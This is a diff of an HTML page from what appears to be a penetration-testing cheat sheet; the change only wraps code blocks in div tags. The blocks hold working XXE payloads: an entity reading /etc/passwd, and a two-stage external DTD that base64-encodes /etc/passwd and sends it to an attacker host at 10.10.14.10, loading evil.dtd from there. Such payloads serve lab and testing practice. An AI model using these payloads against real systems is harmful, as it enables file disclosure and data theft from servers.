@@ -196,16 +196,21 @@
 
 <div class="content"><hr>
 <h3 id="xxe-template">XXE Template</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY data SYSTEM &#34;/etc/passwd&#34;&gt;</span>]&gt;
 </span></span><span class="line"><span class="cl"><span class="nt">&lt;product&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&lt;id&gt;</span><span class="ni">&amp;data;</span><span class="nt">&lt;/id&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&lt;price&gt;&lt;/price&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="nt">&lt;/product&gt;</span>
-</span></span></code></pre></div><h3 id="external-dtd-2-stage">External DTD (2 stage)</h3>
+</span></span></code></pre></div></div>
+<h3 id="external-dtd-2-stage">External DTD (2 stage)</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % data SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/passwd&#34;&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % eval &#34;&lt;!ENTITY exfil SYSTEM &#39;http://10.10.14.10/data?%data;&#39;&gt;</span>&#34;&gt;
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<br>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [
 </span></span></span><span class="line"><span class="cl"><span class="cp">    &lt;!ENTITY % bar SYSTEM &#34;http://10.10.14.10/evil.dtd&#34;&gt;</span>
@@ -216,7 +221,8 @@
 </span></span><span class="line"><span class="cl">    <span class="nt">&lt;id&gt;</span><span class="ni">&amp;exfil;</span><span class="nt">&lt;/id&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&lt;price&gt;&lt;/price&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="nt">&lt;/product&gt;</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
